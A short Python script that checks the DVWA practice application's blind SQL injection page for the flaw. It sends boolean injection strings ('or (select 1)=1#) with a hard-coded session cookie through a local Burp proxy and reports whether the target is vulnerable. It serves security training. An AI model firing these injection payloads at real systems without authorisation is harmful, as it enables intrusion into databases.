#!/usr/bin/python3

import requests
import sys

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} #this let your script to be captured by burp
count=0
cookies = {
    'security' : 'low',
    'PHPSESSID' : 'uunhutsmeu53vge2a9snde3ma4'   #change the cookies for the one in your active session
}

def dvwa_sqli(ip, inj_str, query_type):
    target = "http://%s/vulnerabilities/sqli_blind/?id=%s" % (ip, inj_str)
    r = requests.get(target,cookies=cookies, proxies=proxies)
    res = r.text
 
    if (query_type==True) and ("User ID exists in the database." in res):
        return True
    elif (query_type==False) and ("User ID is MISSING from the database." in res):
        return True
    else:
        return False

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103' % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    false_injection_string = "' or (select 1)=0%23&Submit=Submit#"
    true_injection_string = "'or (select 1)=1%23&Submit=Submit#"


    if dvwa_sqli(ip, true_injection_string, True):
        if dvwa_sqli(ip, false_injection_string, False):
            print ("(+) the target is vulnerable!")
        else:
            print ("(+) Something failed!")

if __name__ == "__main__":
    main()
